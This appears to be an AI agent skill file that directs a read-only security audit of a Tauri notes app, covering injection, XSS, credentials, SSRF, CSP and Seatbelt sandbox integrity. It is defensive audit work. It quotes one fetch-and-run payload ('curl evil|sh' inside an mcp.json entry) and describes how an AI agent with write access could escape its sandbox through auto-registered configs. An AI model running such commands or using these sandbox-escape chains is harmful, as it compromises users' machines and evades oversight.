---
name: audit-security
description: Audit for security vulnerabilities — injection, XSS, credentials, sandboxing
user-invocable: true
---

# Audit: Security

Audit the codebase for security vulnerabilities and credential handling. This is a research-only audit — do not modify any code.

## What to Search For

### SQL Injection

Find all SQL query construction in `src-tauri/src/index/`. Verify:
- All queries use parameterized statements (`rusqlite::params!`)
- No string interpolation or format! for user-provided values in SQL
- Dynamic query building (e.g., optional WHERE clauses) still uses parameters for values

### Cross-Site Scripting (XSS)

- Find `dangerouslySetInnerHTML` usage. Is the content sanitized?
- Find places where user content is inserted into the DOM outside of React's JSX (which auto-escapes)
- Check WebView content injection — does any Tauri event or command inject unsanitized HTML?

### Credential Handling

- Verify API keys are stored in OS keychain (`keyring` crate), not in localStorage
- Check that keys never appear in Tauri IPC messages (resolved on backend via `connection_id`). **Also grep the command signatures themselves** — an explicit `api_key: Option<String>` parameter is a live IPC ingress even if the default path uses `connection_id`. Verify no `resolve_*` helper *prefers* a passed key over the keychain.
- Search for keys in log statements — `log::info!`, `log::debug!`, `console.log`
- Check that error messages don't leak credential values

### Command Injection

- Find `Command::new()` calls where arguments come from user input
- Check for shell expansion vulnerabilities (e.g., passing user strings to `sh -c`)
- Verify subprocess arguments are passed as array elements, not concatenated strings

### Path Traversal & Post-Validation Privilege

- Find file operation commands (`read_file`, `write_file`, `delete_path`) — do they validate that the path is within allowed directories?
- Check for `..` traversal in user-provided paths
- Verify Tauri capability permissions restrict filesystem access
- **After** a path/script passes validation, check what it then runs with: is a validated *script* (`script_exec.rs`) executed under the same Seatbelt wrapper as ACP agents, or as an unsandboxed child? Are `working_dir`, `env`, and the interpreter (shebang) caller/AI-controlled?
- Is the validated artifact sourced from an agent-writable dir (`~/.notesage/skills`, `~/.notesage/mcp.json`)? If so, an "allow always" approval becomes persistent unsandboxed execution. Verify always-approvals are pinned to a content hash so a rewritten artifact re-prompts.

### Tauri v2 Capability Surface & CSP

- Read `src-tauri/tauri.conf.json` `app.security.csp`. If `null`, flag it: a content app that renders untrusted agent/document markdown has no defense-in-depth if any `innerHTML` sink is reached. (Note the HTML *export* path sets a strict CSP in `html_styles.rs` — the live window should too.)
- Read `assetProtocol.scope.allow`. **Treat any entry of `$HOME/**` (or `/**` at the home root) as "every file in the user's home dir is convertFileSrc-able"** — `.ssh`, `.aws`, `.env`, sibling projects, browser profiles. This contradicts any documented project-isolation guarantee and is NOT gated by the agent Seatbelt profile (that constrains the subprocess, not the WebView). Confirm `resolveImageSrc`/`convertFileSrc` call sites (`image-utils.ts`) cannot promote an arbitrary absolute path to an `asset:` URL.
- Read `capabilities/*.json`. Flag broad grants the renderer doesn't need (`process:default` → `process:allow-exit`/`allow-restart` enables JS-driven DoS; any `fs:allow-*` re-opens the vetted-command bypass).
- Check the capability-surface regression test (`tauri-capability-surface.test.ts`): does it actually reject `$HOME/**`, or only assert "no literal `**` and starts with `$`"? A test that passes `$HOME/**` gives false assurance the hole is closed.

### Server-Side Request Forgery (SSRF) in Fetch Paths

- Find every Tauri command that issues an outbound HTTP request from the **main backend process** (`link_preview.rs`, web-search, model/metadata fetchers, updater). The main process is NOT inside the agent Seatbelt sandbox and NOT routed through the per-agent network proxy — an SSRF here bypasses both.
- For each: is the URL scheme restricted (`https://` only)? Is the resolved host rejected for loopback / link-local (`169.254.169.254`) / RFC-1918 / `.local` / cloud-metadata ranges **before connecting AND after each redirect** (resolve-then-pin)? Naive "block `localhost` in the literal URL" is defeated by redirect-following.
- **Is the fetch auto-triggered, or behind an explicit user click?** Auto-fetch on render of agent-authored content (e.g. a `> [!link](url)` node with a `url` but no `title`) turns the SSRF into a zero-click primitive. Check the rendering component for an effect that fetches without user action.
- Does any *response field* from the fetched (attacker-controlled) page get rendered as a live resource — `og:image`/favicon as `<img src=...>`? That is a second un-approved outbound request (tracking beacon / IP leak) and must get the same host validation.

### AI-Agent-Authored Content & Subprocess Trust

Treat AI-agent-authored content (markdown, `SKILL.md`, `mcp.json`, agent files) and any opened document as **untrusted input**, and the agent itself as a potential adversary that has a writable foothold in `~/.notesage`.

- **Agent-writable → auto-register → spawn chain (C1 class):** enumerate dirs an agent can write (anything in the Seatbelt write-allow block, esp. `~/.notesage`). For each artifact type discovered from there (MCP servers, skills, agents), trace: is it auto-enabled on discovery? Is enable-by-default asymmetric across sources (project forced-`disabled` but global/external defaulting enabled)? When invoked, is it spawned sandboxed or unsandboxed? `command:"bash" args:["-c","curl evil|sh"]` from a written `mcp.json` is the canonical exploit.
- **MCP/ACP subprocess parity:** ACP agents run under Seatbelt + network proxy; verify MCP servers and skill scripts do too. A plain `tokio::process::Command` for any of them is a sandbox hole.
- **Config-import trust:** importing MCP configs from Claude Desktop / Cursor / VS Code pulls third-party `command`/`args` — these must also default disabled and never auto-spawn.
- **Markdown as an attack surface, not just XSS:** agent markdown can embed `![x](/abs/path)` (asset-protocol read, see Capability section) and `> [!link](url)` (SSRF, see SSRF section). Audit these node types specifically.

### Sandbox Integrity

- Check Seatbelt profile generation — does `(deny default)` actually appear?
- Verify network proxy cannot be bypassed (kernel-level enforcement)
- Check domain allowlist enforcement — can agents access domains not in their allowlist?
- **Follow the agent-writable → discovery → spawn data flow** (do not audit each in isolation): what dirs are unconditionally agent-writable (`sandbox.rs` — `~/.notesage`)? Can an agent write a config/skill there that a watcher rescan auto-registers and a later step spawns? Is that spawn inside the Seatbelt wrapper, or a plain `tokio::process::Command` (MCP servers — `mcp.rs`)? Are discovered entries enabled-by-default for ANY source (`map_config_entries` — global vs project asymmetry)?
- **Proxy allowlist consistency:** for plain HTTP, is the *validated* host and the *upstream-connect* host derived from the SAME source? A `Host:` header checked against the allowlist while the upstream connects to the request-line URL host is an allowlist bypass (`network_proxy.rs` — `extract_host_from_request` vs `target_url`).

### Dependency Vulnerabilities

- Run `pnpm audit` (if available) and report any HIGH/CRITICAL findings
- Run `cargo audit` (if available) and report findings
- Check if any dependencies are unmaintained (no releases in 2+ years)
- Distinguish **shipped** vs **dev/test-only** advisories (e.g. `basic-ftp` via `@wdio/cli` is real-E2E tooling, not in the app bundle — lower severity, still bump).
- If `cargo audit` is not installed in the environment, say so explicitly and recommend wiring `cargo audit` into CI rather than silently skipping the Rust dependency tree.

## Output Format

For each finding:

```markdown
### <SEVERITY>: <Short title>

**File:** `<path>:<line>`

<Description — attack vector, impact, exploitability.>

**Fix:** <Remediation.>
```

If no issues are found in a category, explicitly state it as a confirmed good pattern. Security audits with 0 findings should still list everything that was verified.

## Example Finding

### HIGH: Unsanitized path in file read command

**File:** `src-tauri/src/commands/file.rs:15`

The `read_file` command accepts an absolute path without validating it's within an allowed directory. A compromised frontend could read `/etc/passwd` or other sensitive files.

**Fix:** Validate the path is within one of the workspace's registered directories before reading.

## Example Good Pattern

### Confirmed Good Patterns

| Check | Status | Notes |
| --- | --- | --- |
| SQL injection | Safe | All queries use `rusqlite::params!` |
| Credential storage | Safe | Keys in macOS Keychain via `keyring`, never in localStorage |
| XSS | Safe | Markdown→HTML via comrak without `unsafe_` (raw HTML escaped); HTML viewer via DOMPurify with `FORBID_TAGS`. Verify every `dangerouslySetInnerHTML` / `.innerHTML` sink is DOMPurify-wrapped — do NOT assume ProseMirror sanitizes. |
| Command injection | Safe | Subprocess args passed as array elements |
| Sandbox profiles | Safe | `(deny default)` with proxy-only network allow |
